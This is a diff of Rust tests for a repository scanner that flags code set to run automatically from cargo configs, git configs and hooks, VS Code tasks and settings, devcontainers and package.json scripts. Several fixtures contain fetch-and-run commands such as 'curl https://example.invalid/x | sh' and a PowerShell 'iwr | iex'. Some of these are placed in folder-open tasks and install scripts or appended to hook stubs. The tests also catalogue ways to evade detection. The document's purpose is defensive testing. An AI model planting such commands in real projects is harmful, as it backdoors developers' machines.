             ("[build]\nrustc-wrapper = \"./w.sh\"\n", 2),
             ("[build]\njobs = 4\nrustc = \"./rustc\"\n", 3),
-            ("[build]\nrustc-workspace-wrapper = \"x\"\n", 2),
+            ("[build]\nrustc-workspace-wrapper = \"tools/x\"\n", 2),
             (
                 "[target.x86_64-unknown-linux-gnu]\nrunner = \"./run.sh\"\n",
                 2,
             ),
             ("[target.'cfg(unix)']\nrunner = [\"./run.sh\"]\n", 2),
-            ("build.rustc-wrapper = \"x\"\n", 1),
+            ("build.rustc-wrapper = \"./x\"\n", 1),
         ] {
             for path in [
                 ".cargo/config.toml",
@@ -2379,6 +2969,31 @@ call post.bat</PreBuildEvent>
                 assert_eq!((f.severity, f.line), (Severity::High, line), "{text}");
             }
         }
+    }
+
+    #[test]
+    fn cargo_config_that_names_an_installed_program_is_medium() {
+        // A bare name is found on PATH, not in the repo: sccache and test runners.
+        for text in [
+            "[build]\nrustc-wrapper = \"sccache\"\n",
+            "[build]\nrustc-workspace-wrapper = 'sccache'\n",
+            "[target.thumbv7em-none-eabihf]\nrunner = \"probe-rs run --chip nRF52840\"\n",
+            "[target.wasm32-unknown-unknown]\nrunner = [\"wasmtime\", \"--dir=.\"]\n",
+            "[target.'cfg(all())']\nrunner = \"wasm-bindgen-test-runner\"\n",
+        ] {
+            let (_, out) = run(".cargo/config.toml", text);
+            assert_eq!(
+                named(&out, "autorun.cargo-config").severity,
+                Severity::Medium,
+                "{text}"
+            );
+        }
+        // A path into the repo, or a bare name with a path argument first, is repo code.
+        let (_, out) = run(
+            ".cargo/config.toml",
+            "[build]\nrustc-wrapper = \"./sccache\"\n",
+        );
+        assert_eq!(named(&out, "autorun.cargo-config").severity, Severity::High);
     }
 
     #[test]
@@ -2399,7 +3014,7 @@ call post.bat</PreBuildEvent>
         // The strongest entry sets the level.
         let (_, out) = run(
             ".cargo/config.toml",
-            "[env]\nA = \"1\"\n[build]\nrustc = \"x\"\n",
+            "[env]\nA = \"1\"\n[build]\nrustc = \"./x\"\n",
         );
         assert_eq!(rules(&out), ["autorun.cargo-config"]);
         assert_eq!(out[0].severity, Severity::High);
@@ -2531,7 +3146,7 @@ call post.bat</PreBuildEvent>
 
     #[test]
     fn settings_that_hide_the_vscode_folder_are_high() {
-        for key in [".vscode", "**/.vscode", "**/.vscode/**"] {
+        for key in [".vscode", "**/.vscode", ".vscode/**", "**/.vscode/**"] {
             let text = format!("{{\"files.exclude\": {{\"**/.git\": true, \"{key}\": true}}}}");
             let (_, out) = run(".vscode/settings.json", &text);
             assert_eq!(
@@ -2540,6 +3155,15 @@ call post.bat</PreBuildEvent>
                 "{key}"
             );
         }
+    }
+
+    #[test]
+    fn settings_that_hide_a_folder_that_only_starts_like_vscode_are_clean() {
+        let (_, out) = run(
+            ".vscode/settings.json",
+            r#"{"files.exclude": {".vscode-test": true, "**/.vscode-test/**": true, "**/.vscode-insiders": true, "x.vscode": true}}"#,
+        );
+        assert!(out.is_empty(), "{out:?}");
     }
 
     #[test]
@@ -2677,11 +3301,19 @@ call post.bat</PreBuildEvent>
                 ".git/hooks/",
                 "hooks/pre-commit",
                 "sub/.git/hooks/x",
+                "sub/git/hooks/y",
             ],
             &mut out,
         );
         let paths: Vec<&str> = out.iter().map(|f| f.path.as_str()).collect();
-        assert_eq!(paths, [".git/hooks/pre-commit", ".git/hooks/post-checkout"]);
+        assert_eq!(
+            paths,
+            [
+                ".git/hooks/pre-commit",
+                ".git/hooks/post-checkout",
+                "sub/.git/hooks/x"
+            ]
+        );
         for f in &out {
             assert_eq!(
                 (f.rule.as_str(), f.severity, f.group, f.line, f.count),
@@ -2729,8 +3361,8 @@ call post.bat</PreBuildEvent>
             "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tfsmonitor = false\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/a.git\n[alias]\n\tco = checkout\n[filter \"lfs\"]\n\trequired = true\n[diff \"x\"]\n\tbinary = true\n",
         );
         assert!(out.is_empty(), "{out:?}");
-        // Only the repo's own config counts.
-        let (_, out) = run("sub/.git/config", "[core]\n\tfsmonitor = ./x\n");
+        // A config that is not in a .git folder is not read.
+        let (_, out) = run("sub/git/config", "[core]\n\tfsmonitor = ./x\n");
         assert!(out.is_empty());
     }
 
@@ -2855,6 +3487,425 @@ call post.bat</PreBuildEvent>
         }
     }
 
+    // Evasions found in review: stray bytes, parse failures, command arrays, git config forms.
+
+    fn bytes_ctx<'a>(path: &'a str, bytes: &'a [u8]) -> FileCtx<'a> {
+        FileCtx {
+            path,
+            bytes,
+            text: None,
+            kind: FileKind::Config,
+            truncated: false,
+        }
+    }
+
+    #[test]
+    fn a_file_with_no_decoded_text_is_still_read_from_its_bytes() {
+        let pkg = b"{\"description\":\"\xff\",\"scripts\":{\"postinstall\":\"node a.js\"}}";
+        let mut out = Vec::new();
+        let s = surfaces(&bytes_ctx("package.json", pkg), &mut out);
+        assert_eq!(commands(&s), ["node a.js"]);
+        let tasks = b"{\"tasks\":[{\"command\":\"make\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]} // \xff";
+        let s = surfaces(&bytes_ctx(".vscode/tasks.json", tasks), &mut Vec::new());
+        assert_eq!(commands(&s), ["make"]);
+        let cfg = b"[core]\n\tfsmonitor = ./hook.sh\n# \xff\n";
+        let mut out = Vec::new();
+        surfaces(&bytes_ctx(".git/config", cfg), &mut out);
+        assert_eq!(
+            named(&out, "autorun.git-config-command").severity,
+            Severity::High
+        );
+    }
+
+    #[test]
+    fn an_unparsable_package_json_is_high_and_its_raw_text_is_read() {
+        for text in [
+            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}} junk"#,
+            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh""#,
+        ] {
+            let (s, out) = run("package.json", text);
+            assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+            let curl = "curl https://example.invalid/x | sh";
+            assert!(
+                commands(&s).iter().any(|c| c.contains(curl)),
+                "{text}: {s:?}"
+            );
+            assert!(s.iter().all(|x| x.trigger == Trigger::Install), "{s:?}");
+        }
+        let (s, _) = run(
+            "package.json",
+            r#"{"scripts":{"postinstall":"node a.js", "build": "x""#,
+        );
+        assert_eq!(commands(&s), ["node a.js"]);
+        assert_eq!(s[0].rule, "autorun.npm-lifecycle");
+    }
+
+    #[test]
+    fn padding_before_the_scripts_does_not_hide_them() {
+        let text = format!(
+            "{{\"x\":\"{}\",\"scripts\":{{\"postinstall\":\"node a.js\"}}",
+            " ".repeat(3 << 20)
+        );
+        let (s, out) = run("package.json", &text);
+        assert_eq!(commands(&s), ["node a.js"]);
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+    }
+
+    #[test]
+    fn an_unparsable_tasks_file_is_high_and_a_folder_open_command_is_still_found() {
+        let text = r#"{"tasks":[{"label":"x","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}  "#;
+        let (s, out) = run(".vscode/tasks.json", text);
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+        all_are(
+            &s,
+            "autorun.vscode-folder-open",
+            Trigger::Open,
+            Severity::Info,
+        );
+        assert!(
+            commands(&s)
+                .iter()
+                .any(|c| c.contains("curl https://example.invalid/x | sh"))
+        );
+        // Without folderOpen nothing runs on open; the failure alone is the finding.
+        let (s, out) = run(".vscode/tasks.json", r#"{"tasks":[{"command":"make"} "#);
+        assert!(s.is_empty());
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+    }
+
+    #[test]
+    fn an_unparsable_devcontainer_is_high_and_initialize_command_is_still_found() {
+        let text = r#"{"initializeCommand": ["bash","-c","curl https://example.invalid/x | sh"], "image": "#;
+        let (s, out) = run(".devcontainer.json", text);
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+        all_are(
+            &s,
+            "autorun.devcontainer-host",
+            Trigger::Open,
+            Severity::Info,
+        );
+        assert!(
+            commands(&s)
+                .iter()
+                .any(|c| c.contains("curl https://example.invalid/x | sh"))
+        );
+        let text = r#"{"initializeCommand": "node a.js", "image": "#;
+        assert_eq!(commands(&run(".devcontainer.json", text).0), ["node a.js"]);
+    }
+
+    #[test]
+    fn task_commands_can_be_arrays() {
+        let (s, _) = run(
+            ".vscode/tasks.json",
+            r#"{"tasks":[
+  {"label":"a","command":["bash","-c","curl https://example.invalid/x | sh"],"runOptions":{"runOn":"folderOpen"}},
+  {"label":"b","command":{"value":["node","a.js"]},"runOptions":{"runOn":"folderOpen"}},
+  {"label":"c","command":"x","windows":{"command":["powershell","-c","iwr https://example.invalid/x | iex"]},"runOptions":{"runOn":"folderOpen"}}
+]}"#,
+        );
+        assert_eq!(
+            commands(&s),
+            [
+                r#"bash -c "curl https://example.invalid/x | sh""#,
+                "node a.js",
+                "x",
+                r#"powershell -c "iwr https://example.invalid/x | iex""#
+            ]
+        );
+    }
+
+    #[test]
+    fn git_config_header_line_entries_and_old_subsections_are_read() {
+        for text in [
+            "[core] fsmonitor = ./hook.sh\n",
+            "[filter.lfs]\n\tclean = ./c.sh\n",
+            "[filter \"x\"] smudge = ./c.sh\n",
+            "[alias] co = !./x.sh\n",
+        ] {
+            let (_, out) = run(".git/config", text);
+            assert_eq!(
+                named(&out, "autorun.git-config-command").severity,
+                Severity::High,
+                "{text:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn git_config_keys_that_name_a_program_are_high() {
+        for text in [
+            "[credential]\n\thelper = !./h.sh\n",
+            "[credential \"https://example.invalid\"]\n\thelper = ./h\n",
+            "[core]\n\taskPass = ./a\n",
+            "[core]\n\tgitProxy = ./p\n",
+            "[sequence]\n\teditor = ./e\n",
+            "[gpg]\n\tprogram = ./g\n",
+            "[gpg \"ssh\"]\n\tprogram = ./g\n",
+            "[diff]\n\texternal = ./d\n",
+            "[diff \"x\"]\n\tcommand = ./d\n",
+            "[merge \"x\"]\n\tdriver = ./m %O\n",
+            "[remote \"o\"]\n\tuploadpack = ./u\n",
+            "[remote \"o\"]\n\treceivepack = ./u\n",
+            "[submodule \"s\"]\n\tupdate = !./u\n",
+        ] {
+            let (_, out) = run(".git/config", text);
+            assert_eq!(
+                named(&out, "autorun.git-config-command").severity,
+                Severity::High,
+                "{text:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn git_config_keys_with_ordinary_values_are_clean() {
+        let (_, out) = run(
+            ".git/config",
+            "[credential]\n\thelper = store\n[credential \"https://example.invalid\"]\n\thelper = cache --timeout=3600\n[submodule \"s\"]\n\tupdate = checkout\n\turl = https://example.invalid/s.git\n[merge \"x\"]\n\tname = a merge\n[gpg]\n\tformat = ssh\n[remote \"o\"]\n\tfetch = +refs/heads/*:refs/remotes/o/*\n",
+        );
+        assert!(out.is_empty(), "{out:?}");
+    }
+
+    #[test]
+    fn git_config_include_is_high() {
+        for text in [
+            "[include]\n\tpath = ../x\n",
+            "[includeIf \"gitdir:/\"]\n\tpath = /etc/x\n",
+            "[include] path = x\n",
+        ] {
+            let (_, out) = run(".git/config", text);
+            let f = named(&out, "autorun.git-config-include");
+            assert_eq!(f.severity, Severity::High, "{text:?}");
+        }
+    }
+
+    #[test]
+    fn the_husky_hooks_path_is_low_and_any_other_is_high() {
+        for value in [".husky", ".husky/_"] {
+            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
+            assert_eq!(rules(&out), ["autorun.git-config-command"]);
+            assert_eq!(out[0].severity, Severity::Low, "{value}");
+        }
+        for value in [".githooks", ".husky/../x", "/tmp/h", ".husky2"] {
+            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
+            assert_eq!(out[0].severity, Severity::High, "{value}");
+        }
+        // A husky path beside a command is still HIGH.
+        let (_, out) = run(
+            ".git/config",
+            "[core]\n\thooksPath = .husky\n\tfsmonitor = ./x\n",
+        );
+        assert_eq!(out[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn nested_and_worktree_git_configs_are_read() {
+        for path in [
+            "sub/.git/config",
+            "a/b/.git/config",
+            ".git/config.worktree",
+            "sub/.git/config.worktree",
+        ] {
+            let (_, out) = run(path, "[core]\n\tfsmonitor = ./x\n");
+            let f = named(&out, "autorun.git-config-command");
+            assert_eq!((f.severity, f.path.as_str()), (Severity::High, path));
+        }
+    }
+
+    const PRE_COMMIT_STUB: &str = "#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\n# ID: 138fd403232d2ddd5efb44317e38bf03\n\n# start templated\nINSTALL_PYTHON=/usr/bin/python3\nARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)\n# end templated\n\nHERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nARGS+=(--hook-dir \"$HERE\" -- \"$@\")\n\nif [ -x \"$INSTALL_PYTHON\" ]; then\n    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"\nelif command -v pre-commit > /dev/null; then\n    exec pre-commit \"${ARGS[@]}\"\nelse\n    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2\n    exit 1\nfi\n";
+
+    const LFS_STUB: &str = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/pre-push' file in the repository.\\n\"; exit 2; }\ngit lfs pre-push \"$@\"\n";
+
+    const LEFTHOOK_STUB: &str = "#!/bin/sh\n\nif [ \"$LEFTHOOK_VERBOSE\" = \"1\" -o \"$LEFTHOOK_VERBOSE\" = \"true\" ]; then\n  set -x\nfi\n\nif [ \"$LEFTHOOK\" = \"0\" ]; then\n  exit 0\nfi\n\ncall_lefthook()\n{\n  if lefthook -h >/dev/null 2>&1\n  then\n    lefthook \"$@\"\n  else\n    echo \"Can't find lefthook in PATH\"\n  fi\n}\n\ncall_lefthook run \"pre-commit\" \"$@\"\n";
+
+    /// The severity the entry finding of a hook has after the orchestrator offers its text.
+    fn hook_severity(path: &str, text: &str) -> Severity {
+        let mut out = Vec::new();
+        entry_findings(&[path], &mut out);
+        assert_eq!(out.len(), 1, "{path}");
+        lower_hook_stubs(&ctx(path, text), &mut out);
+        out[0].severity
+    }
+
+    #[test]
+    fn hook_installer_stubs_are_low() {
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", PRE_COMMIT_STUB),
+            Severity::Low
+        );
+        assert_eq!(
+            hook_severity(".git/hooks/pre-push", LFS_STUB),
+            Severity::Low
+        );
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", LEFTHOOK_STUB),
+            Severity::Low
+        );
+        assert_eq!(
+            hook_severity("sub/.git/hooks/pre-commit", PRE_COMMIT_STUB),
+            Severity::Low
+        );
+        // A CRLF copy of a stub is the same stub.
+        let crlf = PRE_COMMIT_STUB.replace('\n', "\r\n");
+        assert_eq!(hook_severity(".git/hooks/pre-commit", &crlf), Severity::Low);
+        // The finding says what it is.
+        let mut out = Vec::new();
+        entry_findings(&[".git/hooks/pre-commit"], &mut out);
+        lower_hook_stubs(&ctx(".git/hooks/pre-commit", PRE_COMMIT_STUB), &mut out);
+        assert!(out[0].why.contains("pre-commit"), "{}", out[0].why);
+    }
+
+    #[test]
+    fn an_edited_hook_stub_is_high() {
+        let evil = "curl https://example.invalid/x | sh\n";
+        for (path, stub) in [
+            (".git/hooks/pre-commit", PRE_COMMIT_STUB),
+            (".git/hooks/pre-push", LFS_STUB),
+            (".git/hooks/pre-commit", LEFTHOOK_STUB),
+        ] {
+            let appended = format!("{stub}{evil}");
+            assert_eq!(
+                hook_severity(path, &appended),
+                Severity::High,
+                "{path} appended"
+            );
+            let inserted = stub.replacen('\n', &format!("\n{evil}"), 1);
+            assert_eq!(
+                hook_severity(path, &inserted),
+                Severity::High,
+                "{path} inserted"
+            );
+        }
+        let swapped = PRE_COMMIT_STUB.replace("exec pre-commit", "exec ./pre-commit");
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", &swapped),
+            Severity::High
+        );
+        let other_file = LEFTHOOK_STUB.replace("lefthook -h", "node run.js");
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", &other_file),
+            Severity::High
+        );
+        // A stub under the wrong hook name, an unknown hook and a header alone are not stubs.
+        assert_eq!(
+            hook_severity(".git/hooks/post-merge", LFS_STUB),
+            Severity::High
+        );
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n"),
+            Severity::High
+        );
+        let header = PRE_COMMIT_STUB
+            .lines()
+            .take(3)
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", &header),
+            Severity::High
+        );
+    }
+
+    #[test]
+    fn offering_another_file_leaves_hook_findings_alone() {
+        let mut out = Vec::new();
+        entry_findings(&[".git/hooks/pre-commit"], &mut out);
+        lower_hook_stubs(&ctx("README.md", PRE_COMMIT_STUB), &mut out);
+        assert_eq!(out[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn vscode_settings_that_name_a_program_inside_the_repo_are_high() {
+        for (key, value) in [
+            ("python.defaultInterpreterPath", "./venv/bin/python"),
+            (
+                "python.defaultInterpreterPath",
+                "${workspaceFolder}/.venv/bin/python",
+            ),
+            ("typescript.tsdk", "tools/ts/lib"),
+            ("eslint.runtime", "scripts/node"),
+            ("git.path", "bin/git"),
+            ("rust-analyzer.server.path", "./ra"),
+            ("clangd.path", "tools/clangd"),
+            ("go.goroot", "${workspaceRoot}/go"),
+        ] {
+            let text = format!("{{\"editor.fontSize\": 12,\n \"{key}\": \"{value}\"}}");
+            let (_, out) = run(".vscode/settings.json", &text);
+            let f = named(&out, "autorun.vscode-program");
+            assert_eq!((f.severity, f.line), (Severity::High, 2), "{key} {value}");
+        }
+    }
+
+    #[test]
+    fn vscode_settings_that_name_a_program_outside_the_repo_are_medium() {
+        for (key, value) in [
+            ("python.defaultInterpreterPath", "/usr/bin/python3"),
+            ("git.path", "~/bin/git"),
+            ("eslint.runtime", "${env:HOME}/bin/node"),
+            (
+                "python.defaultInterpreterPath",
+                "${userHome}/.venv/bin/python",
+            ),
+            ("git.path", "C:\\\\tools\\\\git.exe"),
+            // An installed dependency, not code the repo ships.
+            ("typescript.tsdk", "node_modules/typescript/lib"),
+            ("typescript.tsdk", "./node_modules/typescript/lib"),
+        ] {
+            let text = format!("{{\"{key}\": \"{value}\"}}");
+            let (_, out) = run(".vscode/settings.json", &text);
+            let f = named(&out, "autorun.vscode-program");
+            assert_eq!(f.severity, Severity::Medium, "{key} {value}");
+        }
+    }
+
+    #[test]
+    fn vscode_settings_with_bare_names_or_other_keys_are_clean() {
+        let (_, out) = run(
+            ".vscode/settings.json",
+            r#"{"python.defaultInterpreterPath": "python3", "git.path": "git", "eslint.runtime": "node", "myext.path": "./x", "editor.fontSize": 12, "typescript.tsdk": ""}"#,
+        );
+        assert!(out.is_empty(), "{out:?}");
+    }
+
+    const WORKSPACE: &str = r#"{
+  "folders": [{"path": "."}],
+  "settings": {"git.path": "./bin/git", "terminal.integrated.env.linux": {"A": "b"}},
+  "tasks": {"version": "2.0.0", "tasks": [
+    {"label": "x", "command": "curl https://example.invalid/x | sh", "runOptions": {"runOn": "folderOpen"}}
+  ]}
+}"#;
+
+    #[test]
+    fn a_code_workspace_gets_the_rules_of_settings_and_tasks() {
+        let (s, out) = run("app/dev.code-workspace", WORKSPACE);
+        assert_eq!(commands(&s), ["curl https://example.invalid/x | sh"]);
+        all_are(
+            &s,
+            "autorun.vscode-folder-open",
+            Trigger::Open,
+            Severity::Info,
+        );
+        assert_eq!(s[0].dir, "app");
+        assert_eq!(
+            named(&out, "autorun.vscode-program").severity,
+            Severity::High
+        );
+        assert_eq!(named(&out, "autorun.vscode-env").severity, Severity::Medium);
+        let (_, out) = run(
+            "x.code-workspace",
+            r#"{"settings": {"files.exclude": {"**/.vscode": true}}}"#,
+        );
+        assert_eq!(
+            named(&out, "autorun.vscode-hidden").severity,
+            Severity::High
+        );
+        // Nothing to read: no finding. A workspace that does not parse is HIGH.
+        let (s, out) = run("x.code-workspace", r#"{"folders": [{"path": "."}]}"#);
+        assert!(s.is_empty() && out.is_empty());
+        let (_, out) = run("x.code-workspace", r#"{"settings": "#);
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
+    }
+
     // Hostile files: work stays linear and the stack stays small.
 
     fn within(seconds: u64, what: &str, started: std::time::Instant) {
@@ -2894,7 +3945,7 @@ call post.bat</PreBuildEvent>
         let text = "a \\\n".repeat(200_000);
         let started = std::time::Instant::now();
         let (s, _) = run("Makefile", &text);
-        within(3, "200,000 continued lines", started);
+        within(15, "200,000 continued lines", started);
         assert!(s.is_empty());
     }
 
@@ -2909,7 +3960,7 @@ call post.bat</PreBuildEvent>
             let text = format!("[{header}]\n{entries}");
             let started = std::time::Instant::now();
             let _ = run(path, &text);
-            within(3, path, started);
+            within(15, path, started);
         }
     }
 
@@ -2921,22 +3972,13 @@ call post.bat</PreBuildEvent>
         );
         let started = std::time::Instant::now();
         let (s, _) = run("App.csproj", &text);
-        within(3, "100,000 Exec elements", started);
+        within(15, "100,000 Exec elements", started);
         assert_eq!(s.len(), 100_000);
         assert_eq!((s[0].line, s[99_999].line), (1, 100_000));
     }
 
     #[test]
-    fn files_that_are_not_text_or_not_known_find_nothing() {
-        let f = FileCtx {
-            path: "package.json",
-            bytes: b"\x00\x01",
-            text: None,
-            kind: FileKind::Binary,
-            truncated: false,
-        };
-        let mut out = Vec::new();
-        assert!(surfaces(&f, &mut out).is_empty() && out.is_empty());
+    fn files_that_are_not_known_find_nothing() {
         for path in [
             "src/main.rs",
             "README.md",
